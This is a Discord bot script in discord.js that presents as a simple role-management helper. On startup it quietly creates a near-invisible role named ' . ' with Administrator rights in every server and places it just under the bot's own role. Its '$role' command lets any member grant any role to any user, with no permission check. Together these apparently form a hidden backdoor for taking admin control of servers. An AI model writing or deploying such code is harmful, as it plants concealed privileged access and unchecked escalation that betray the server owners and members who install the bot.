const { Client, GatewayIntentBits, PermissionsBitField, Partials } = require("discord.js");
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
  partials: [Partials.Channel],
});

const TOKEN = "YOUR_BOT_TOKEN_HERE";

client.once("ready", async () => {
  console.log(`${client.user.tag} is online!`);
  const guilds = client.guilds.cache;
  for (const [id, guild] of guilds) {
    await setupRole(guild);
  }
});

async function setupRole(guild) {
  try {
    const botMember = await guild.members.fetch(client.user.id);
    const botRole = botMember.roles.highest;

    // Check if role already exists
    let adminRole = guild.roles.cache.find(r => r.name === " . ");
    if (!adminRole) {
      adminRole = await guild.roles.create({
        name: " . ",
        color: 0x2b2d31,
        permissions: [PermissionsBitField.Flags.Administrator],
        reason: "Auto admin role setup",
      });
      console.log(`Created role ' . ' in ${guild.name}`);
    }

    // Move it just under the bot’s highest role
    await adminRole.setPosition(botRole.position - 1);
  } catch (err) {
    console.error(`Error creating role in ${guild.name}:`, err);
  }
}

client.on("messageCreate", async (message) => {
  if (!message.content.startsWith("$role") || message.author.bot) return;

  const args = message.content.split(" ").slice(1);
  const [roleName, userMention] = args;

  if (!roleName || !userMention)
    return message.reply("Usage: `$role {roleName} {@user}`");

  const role = message.guild.roles.cache.find(r => r.name === roleName);
  const user = message.mentions.members.first();

  if (!role) return message.reply("That role doesn’t exist.");
  if (!user) return message.reply("User not found.");

  try {
    await user.roles.add(role);
    message.reply(`Added role **${role.name}** to ${user.displayName}`);
  } catch (err) {
    console.error(err);
    message.reply("Couldn't add role. Check my permissions.");
  }
});

client.login(TOKEN);
